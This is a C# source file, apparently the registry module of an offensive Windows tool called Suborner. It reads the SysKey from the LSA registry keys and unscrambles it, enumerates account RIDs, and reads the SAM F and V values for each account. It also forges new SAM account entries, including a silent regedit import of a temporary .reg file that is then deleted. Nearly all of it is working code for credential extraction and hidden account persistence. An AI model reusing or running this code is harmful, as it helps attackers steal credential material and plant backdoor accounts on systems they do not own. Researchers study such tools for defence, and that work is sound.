using System;
using System.Text;
using static Suborner.Natives;
using Suborner.Module;
using Suborner.UI;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using Suborner.Core;
using System.IO;
using System.Diagnostics;

namespace Suborner
{

    // DEMOREMOVE
    static class RegistryManager
    {
        const uint HK_CLASSES_ROOT_NKEY = (0x80000000);
        const uint HK_CURRENT_USER_NKEY = (0x80000001);
        const uint HK_LOCAL_MACHINE_NKEY = (0x80000002);
        const uint HK_USERS_NKEY = (0x80000003);
        const uint HK_CURRENT_CONFIG_NKEY = (0x80000005);

        const string SAM_DOMAINS_ACCOUNT_KEYPATH = @"SAM\SAM\Domains\Account\";
        const string SAM_DOMAINS_ACCOUNT_USERS_KEYPATH = @"SAM\SAM\Domains\Account\Users\";
        const string LSA_CURRENTCONTROLSET_CONTROL_KEYPATH = @"SYSTEM\CurrentControlSet\Control\Lsa\";

        const int SYSKEY_LENGTH = 16;
        static string[] SYSKEY_NAMES = { "JD", "Skew1", "GBG", "Data" };
        static byte[] SYSKEY_PERMUT = { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };
        // static byte[] SYSKEY_PERMUT = { 11, 6, 7, 1, 8, 10, 14, 0, 3, 5, 2, 15, 13, 9, 12, 4 }; Green Fruit Lover Version

        const uint KEY_QUERY_VALUE = (0x1);
        const uint KEY_READ = (0x19); // Update this with mm flags?
        const uint KEY_ALL_ACCESS = (0x3F);

        const uint RRF_RT_ANY = (0x0000ffff);

        public static byte[] GetSysKey()
        {
            Printer.PrintDebug("Retrieving SysKey");
            StringBuilder scrambledKey = new StringBuilder();

            for (int i = 0; i < SYSKEY_NAMES.Length; i++)
            {
                string keyPath = LSA_CURRENTCONTROLSET_CONTROL_KEYPATH + SYSKEY_NAMES[i];
                UIntPtr regKeyHandle = OpenRegKey("HKLM", keyPath);
                scrambledKey.Append(GetRegKeyClassData(regKeyHandle));
                CloseRegKey(regKeyHandle);
            }
            byte[] scrambled = Utility.StringToByteArray(scrambledKey.ToString());
            byte[] unscrambled = new byte[16];
            for (int i = 0; i < SYSKEY_LENGTH; i++)
            {
                unscrambled[i] = scrambled[SYSKEY_PERMUT[i]];
            }
            return unscrambled;
        }
        public static int[] GetUsersRIDs()
        {
            UIntPtr hKey = OpenRegKey("HKLM", SAM_DOMAINS_ACCOUNT_USERS_KEYPATH);
            uint MAX_REG_KEY_SIZE = 1024;
            uint MAX_CLASS_DATA_SIZE = 1024;

            int numberOfSubkeys = 0;
            int[] rids = null;
            StringBuilder classData = new StringBuilder(1024);

            if (RegQueryInfoKey(hKey, classData, ref MAX_REG_KEY_SIZE, UIntPtr.Zero,
                out numberOfSubkeys, UIntPtr.Zero, UIntPtr.Zero, UIntPtr.Zero, UIntPtr.Zero,
                UIntPtr.Zero, UIntPtr.Zero, UIntPtr.Zero) == 0)
            {
                if (numberOfSubkeys != 0)
                {
                    rids = new int[numberOfSubkeys - 1];
                    for (uint i = 0; i < numberOfSubkeys - 1; i++)
                    {
                        long LastWriteTime;
                        uint MAX_VALUE_NAME = 16383;
                        StringBuilder subkeyName = new StringBuilder(16383);
                        RegEnumKeyEx(hKey, i, subkeyName, ref MAX_VALUE_NAME, IntPtr.Zero, classData, ref MAX_CLASS_DATA_SIZE, out LastWriteTime);
                        rids[i] = Int32.Parse(subkeyName.ToString(), System.Globalization.NumberStyles.HexNumber);
                    }
                }
                CloseRegKey(hKey);
            }
            return rids;
        }

        public static byte[] GetSamDomainAccountF() 
        {
            //TODO: Implement with API Calls
            byte[] val = null;
            RegistryKey key = Registry.LocalMachine.OpenSubKey(SAM_DOMAINS_ACCOUNT_KEYPATH);
            val = (byte[])key.GetValue("F");
            key.Close();
            return val;
        }
        public static void GetUserData(int rid, out byte[] F, out byte[] V)
        {
            //TODO: Implement with API Calls
            byte[] FValue = null;
            byte[] VValue = null;
            string keyName = Utility.ConvertRIDToHexString(rid);

            RegistryKey userKey = Registry.LocalMachine.OpenSubKey(SAM_DOMAINS_ACCOUNT_USERS_KEYPATH + keyName);
            FValue = (byte[])userKey.GetValue("F");
            VValue = (byte[])userKey.GetValue("V");
            userKey.Close();

            F = FValue;
            V = VValue;
        }

        public static void WriteNamesKey(string username, int rid)
        {
            // TODO: This needs to be fileless somehoW!
            string fileName = SubornerContext.Instance.cwd + username + rid + ".txt";
            try
            {
                using (FileStream fs = File.Create(fileName))
                {
                    // Add some text to file    
                    Byte[] content = new UTF8Encoding(true).GetBytes(SubornerContext.Instance.newNames);
                    fs.Write(content, 0, content.Length);
                }
            }
            catch (Exception Ex)
            {
                Printer.PrintError("Error trying to write names key");
            }
            var regPath = "";
            if (Environment.Is64BitOperatingSystem && !Environment.Is64BitProcess)
                regPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "regedit.exe");
            else
                regPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.SystemX86), "regedit.exe");

            Process regeditProcess = Process.Start(regPath, "/s \"" + fileName + "\"");
            regeditProcess.WaitForExit();

            File.Delete(fileName);
        }

        public static void WriteAccountKeys(int rid, byte[] FValue, byte[] VValue) {
            string keyPath = SAM_DOMAINS_ACCOUNT_USERS_KEYPATH + Utility.ConvertRIDToHexString(rid);
            UIntPtr hKey = UIntPtr.Zero;
            hKey = CreateRegKey("HKLM", keyPath);
            SetRegKey(hKey, "F", FValue, 3);
            SetRegKey(hKey, "V", VValue, 3);


        }

        /// <summary>
        /// Custom wrapper for the <c>RegOpenKeyEx</c> Win32 API Function
        /// </summary>
        /// <param name="rootKey"></param>
        /// <param name="subKey">Path of the subkey</param>
        /// <returns></returns>
        private static UIntPtr OpenRegKey(string rootKey, string subKey)
        {
            UIntPtr hRootKey = UIntPtr.Zero;
            UIntPtr hSubkey = UIntPtr.Zero;

            switch (rootKey)
            {
                case "HKCR":
                    hRootKey = new UIntPtr(HK_CLASSES_ROOT_NKEY);
                    break;
                case "HKCU":
                    hRootKey = new UIntPtr(HK_CURRENT_USER_NKEY);
                    break;
                case "HKLM":
                    hRootKey = new UIntPtr(HK_LOCAL_MACHINE_NKEY);
                    break;
                case "HKU":
                    hRootKey = new UIntPtr(HK_USERS_NKEY);
                    break;
                case "HKCC":
                    hRootKey = new UIntPtr(HK_CURRENT_CONFIG_NKEY);
                    break;
                default:
                    return hSubkey;
            }

            if (RegOpenKeyEx(hRootKey, subKey, 0, KEY_ALL_ACCESS, out hSubkey) == 0)
            {
                return hSubkey;
            }
            else
            {
                Printer.PrintError(String.Format("Error: Could not access to {0}:{1}", rootKey, subKey));
                return hSubkey;
            }
        }

        private static UIntPtr CreateRegKey(string rootKey, string subKey)
        {
            UIntPtr hRootKey = UIntPtr.Zero;
            UIntPtr hSubkey = UIntPtr.Zero;
            RegResult disposition;
            switch (rootKey)
            {
                case "HKCR":
                    hRootKey = new UIntPtr(HK_CLASSES_ROOT_NKEY);
                    break;
                case "HKCU":
                    hRootKey = new UIntPtr(HK_CURRENT_USER_NKEY);
                    break;
                case "HKLM":
                    hRootKey = new UIntPtr(HK_LOCAL_MACHINE_NKEY);
                    break;
                case "HKU":
                    hRootKey = new UIntPtr(HK_USERS_NKEY);
                    break;
                case "HKCC":
                    hRootKey = new UIntPtr(HK_CURRENT_CONFIG_NKEY);
                    break;
                default:
                    return hSubkey;
            }

            if (RegCreateKeyEx(hRootKey, subKey, UIntPtr.Zero, null, RegOption.NonVolatile, RegSAM.AllAccess, UIntPtr.Zero, out hSubkey, out disposition) != 0){
                Printer.PrintError(String.Format("Error creating the key {0}:{1}", rootKey, subKey)) ;
                System.Environment.Exit(1);
            }
            return hSubkey;
        }

        private static void SetRegKey(UIntPtr hKey, string valueName, byte[] value, uint dataType) 
        {

            IntPtr valuePointer = IntPtr.Zero;
            if (value != null) {
                valuePointer = Marshal.AllocHGlobal(value.Length);
                Marshal.Copy(value, 0, valuePointer, value.Length);
            }
            
            if (RegSetValueEx(hKey, valueName, 0, dataType, valuePointer, value.Length) != 0) 
            {
                Printer.PrintError(String.Format("Error writing {0}", valueName));
                System.Environment.Exit(1);
            }

            Marshal.FreeHGlobal(valuePointer);
        }

        private static void CloseRegKey(UIntPtr hKey)
        {
            if (RegCloseKey(hKey) != 0)
            {
                Printer.PrintError("Error closing key handle");
            }
        }

        private static string GetRegKeyClassData(UIntPtr hKey)
        {
            uint classLength = 1024;
            int numberOfSubKeys = 0;
            StringBuilder classData = new StringBuilder(1024);
            if (RegQueryInfoKey(hKey, classData, ref classLength, UIntPtr.Zero,
                out numberOfSubKeys, UIntPtr.Zero, UIntPtr.Zero, UIntPtr.Zero, UIntPtr.Zero,
                UIntPtr.Zero, UIntPtr.Zero, UIntPtr.Zero) == 0)
            {
                return classData.ToString();
            }
            else
            {
                Printer.PrintError("Error getting registry key class data");
                return "";
            }
        }


        

    }
}
